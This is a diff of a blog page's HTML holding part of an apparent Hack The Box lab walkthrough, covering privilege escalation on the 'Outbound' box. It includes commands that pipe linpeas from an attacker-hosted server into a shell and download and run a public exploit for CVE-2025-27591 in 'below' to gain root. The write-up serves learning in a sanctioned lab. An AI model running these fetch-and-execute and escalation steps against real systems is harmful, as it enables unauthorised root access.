 <p>Here&rsquo;s how to decrypt the password:</p>
 <ol>
@@ -209,80 +287,140 @@ Here is a sneak peak:</p>
 <li>Get the password</li>
 </ol>
 <p>Here is the decrypted password we get:</p>
-<p><img src="password_decrypt.png" alt="CyberChef decrypting the password"></p>
-<h3 id="privilege-escalation">Privilege Escalation<a href="#privilege-escalation" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h3>
+<p><img alt="CyberChef decrypting the password" loading="lazy" src="/posts/2/password_decrypt.png"></p>
+<h3 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h3>
 <p>Now that we have jacob in our control, let&rsquo;s check this lad&rsquo;s account shall we</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su jacob
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>su jacob
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Enter the password</span>
 </span></span><span style="display:flex;"><span>cat /home/jacob/user.txt
 </span></span></code></pre></div><p>We&rsquo;ve got the user flag!</p>
 <p>Now that we are Jacob let&rsquo;s check the home folder</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /home/jacob
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cd /home/jacob
 </span></span></code></pre></div><p>It had a mail folder which had a <code>INBOX</code> folder which contained a file <code>jacob</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat jacob
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>cat jacob
 </span></span></code></pre></div><p>Gave us 2 mails,
 One contained the ssh credentials for jacob
 The other said:</p>
 <blockquote>
 <p>&ldquo;We have been experiencing high resource consumption on our main server.
 For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
-Please inform us immediately if you notice any irregularities.&rdquo;</p></blockquote>
+Please inform us immediately if you notice any irregularities.&rdquo;</p>
+</blockquote>
 <p>This is a massive clue. It sounds like Jacob has special permissions to run a service as root. Time for a proper shell!</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh jacob@10.10.11.77
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ssh jacob@10.10.11.77
 </span></span></code></pre></div><p>Now that we have user.txt and a massive clue from that mail lets check how we can escalate.
 Lets use <code>LinPeas</code> to find something (<code>sudo -l</code> could also reveal information but linpeas might give additional details)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># On your machine - where linpeas.sh resides</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># On your machine - where linpeas.sh resides</span>
 </span></span><span style="display:flex;"><span>sudo python3 -m http.server <span style="color:#ae81ff">80</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># On victim&#39;s ssh shell</span>
 </span></span><span style="display:flex;"><span>curl -L &lt;Your-HTB-IP&gt;/linpeas.sh | sh
 </span></span></code></pre></div><p>As predicted we got this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>User jacob may run the following commands on outbound:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>User jacob may run the following commands on outbound:
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>ALL : ALL<span style="color:#f92672">)</span> NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
 </span></span></code></pre></div><p>We can run the <code>below</code> command as root without a password. A goldmine, if I ever saw one. This part took me the most time, as I was trying to exploit it manually without success.</p>
 <p>A quick search online for a <code>below</code> exploit leads to <code>CVE-2025-27591</code>.</p>
 <p>I found a really cool python exploitation script <a href="https://github.com/BridgerAlderson/CVE-2025-27591-PoC">(Check it out)</a></p>
 <p>I transferred the script to the victim machine and ran it.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># On your machine</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># On your machine</span>
 </span></span><span style="display:flex;"><span>python3 -m http.server <span style="color:#ae81ff">80</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># On the victim&#39;s machine</span>
 </span></span><span style="display:flex;"><span>wget http://&lt;Your-HTB-IP&gt;/exploit.py
 </span></span><span style="display:flex;"><span>python3 exploit.py
 </span></span></code></pre></div><p>And Wham-Bam-Thank-You-Ma&rsquo;am! We got root!</p>
-<p><img src="cover.png" alt="HTB PWNED"></p>
+<p><img alt="HTB PWNED" loading="lazy" src="/posts/2/cover.png"></p>
 <p>Now, just head to <code>/root</code> and grab your well-earned flag.</p>
-<p>Happy Hacking! And see you next week</p>
+<p>Happy Hacking! And see you next time.</p>
 
-      </div></div>
-
-  
-
-  
-    
-
-  
-</article>
 
   </div>
 
-  
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+  </footer>
+</article>
+    </main>
     
+<footer class="footer">
+        <span>&copy; 2026 <a href="https://Maaroof-Khan10.github.io/">Maaroof Khan (Blog)</a></span> · 
 
+    
+    
+    <span>
+        Powered by
+        <a href="https://gohugo.io/?utm_source=papermod" rel="noopener" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" id="top-link" class="top-link hidden" aria-label="go to top" title="Go to Top (Alt + G)" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+        stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevrons-up">
+        <polyline points="17 11 12 6 7 11"></polyline>
+        <polyline points="17 18 12 13 7 18"></polyline>
+    </svg>
+</a>
 
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
 
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
 
-<script type="text/javascript" src="/bundle.min.js"></script>
+</script>
+<script>
+    var toplink = document.getElementById("top-link");
+    window.onscroll = function () {
+        const scrollThreshold = window.innerHeight;
+        if (document.body.scrollTop > scrollThreshold || document.documentElement.scrollTop > scrollThreshold) {
+            toplink.classList.remove("hidden");
+        } else {
+            toplink.classList.add("hidden");
+        }
+    };
 
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
 
-
-
-
-
-
-
-  
-</div>
-
+</script>
 </body>
+
 </html>
